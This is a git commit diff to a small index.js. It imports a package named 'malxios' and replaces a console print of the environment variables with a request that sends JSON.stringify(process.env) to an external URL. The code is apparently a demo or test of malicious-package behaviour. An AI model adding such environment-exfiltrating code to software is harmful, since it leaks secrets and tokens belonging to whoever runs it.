19505d006e804b9838b2cf97f3a7bbc772df9374
Gabi Nir <gabinir@gmail.com>
2023-06-04 14:08:05 +0300

    Update index.js

--- index.js
+++ index.js
@@ -1,9 +1,8 @@
 import malxios from "malxios";
 
-console.log(process.env)
-// malxios.request({
-// 	method: "get",
-// 	headers: {},
-// 	url: "https://www.google.com",
-// 	data: JSON.stringify(process.env),
-// });
+ malxios.request({
+ 	method: "get",
+ 	headers: {},
+ 	url: "https://www.google.com",
+ 	data: JSON.stringify(process.env),
+});
